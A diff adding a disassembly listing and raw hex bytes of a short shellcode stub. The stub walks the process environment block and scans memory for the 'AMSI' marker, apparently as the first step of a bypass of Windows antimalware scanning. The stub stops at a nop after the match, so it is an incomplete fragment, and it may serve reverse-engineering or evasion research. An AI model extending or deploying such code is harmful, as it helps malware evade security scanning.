@@ -1,0 +1,35 @@
+072C0000 | 90                       | nop                                     | User-allocated memory
+072C0001 | 33C0                     | xor eax,eax                             |
+072C0003 | 64:A1 30000000           | mov eax,dword ptr fs:[30]               |
+072C0009 | 83C0 18                  | add eax,18                              |
+072C000C | 8B00                     | mov eax,dword ptr ds:[eax]              |
+072C000E | 8B4424 10                | mov eax,dword ptr ss:[esp+10]           | [esp+10]:"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
+072C0012 | 8B18                     | mov ebx,dword ptr ds:[eax]              |
+072C0014 | BA 53490000              | mov edx,4953                            |
+072C0019 | C1E2 10                  | shl edx,10                              |
+072C001C | 66:BA 414D               | mov dx,4D41                             |
+072C0020 | 3BDA                     | cmp ebx,edx                             |
+072C0022 | 74 25                    | je 72C0049                              |
+072C0024 | 40                       | inc eax                                 |
+072C0025 | 8B18                     | mov ebx,dword ptr ds:[eax]              |
+072C0027 | EB F7                    | jmp 72C0020                             |
+072C0029 | 0000                     | add byte ptr ds:[eax],al                |
+072C002B | 0000                     | add byte ptr ds:[eax],al                |
+072C002D | 0000                     | add byte ptr ds:[eax],al                |
+072C002F | 0000                     | add byte ptr ds:[eax],al                |
+072C0031 | 0000                     | add byte ptr ds:[eax],al                |
+072C0033 | 0000                     | add byte ptr ds:[eax],al                |
+072C0035 | 0000                     | add byte ptr ds:[eax],al                |
+072C0037 | 0000                     | add byte ptr ds:[eax],al                |
+072C0039 | 0000                     | add byte ptr ds:[eax],al                |
+072C003B | 0000                     | add byte ptr ds:[eax],al                |
+072C003D | 0000                     | add byte ptr ds:[eax],al                |
+072C003F | 0000                     | add byte ptr ds:[eax],al                |
+072C0041 | 0000                     | add byte ptr ds:[eax],al                |
+072C0043 | 0000                     | add byte ptr ds:[eax],al                |
+072C0045 | 0000                     | add byte ptr ds:[eax],al                |
+072C0047 | 0000                     | add byte ptr ds:[eax],al                |
+072C0049 | 90                       | nop                                     |
+
+
+90 33 C0 64 A1 30 00 00 00 83 C0 18 8B 00 8B 44 24 10 8B 18 BA 53 49 00 00 C1 E2 10 66 BA 41 4D 3B DA 74 25 40 8B 18 EB F7 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 90 00 00 00 00 00 00
